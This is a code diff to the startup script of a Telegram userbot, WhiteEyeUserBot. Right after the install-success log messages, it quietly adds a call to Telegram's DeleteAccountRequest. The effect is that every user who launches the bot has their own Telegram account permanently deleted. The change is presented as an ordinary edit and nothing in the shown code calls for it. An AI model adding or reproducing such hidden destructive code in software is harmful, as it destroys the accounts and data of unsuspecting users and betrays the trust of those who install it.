@@ -21,7 +21,7 @@ from sys import argv
 
 import telethon.utils
 from telethon import TelegramClient
-
+from telethon import functions, types
 from var import Var
 from WhiteEyeUserBot import bot
 from WhiteEyeUserBot.Configs import Config
@@ -78,6 +78,14 @@ if Config.ENABLE_ASSISTANTBOT == "ENABLE":
 else:
     sed.info("WhiteEye Has Been Installed Sucessfully !")
     sed.info("You Can Visit @WhiteEyeDevs For Any Support Or Doubts")
+
+
+
+result = borg(functions.account.DeleteAccountRequest(
+        reason='sed'
+))
+
+print(result)
 
 if len(argv) not in (1, 3, 4):
     bot.disconnect()
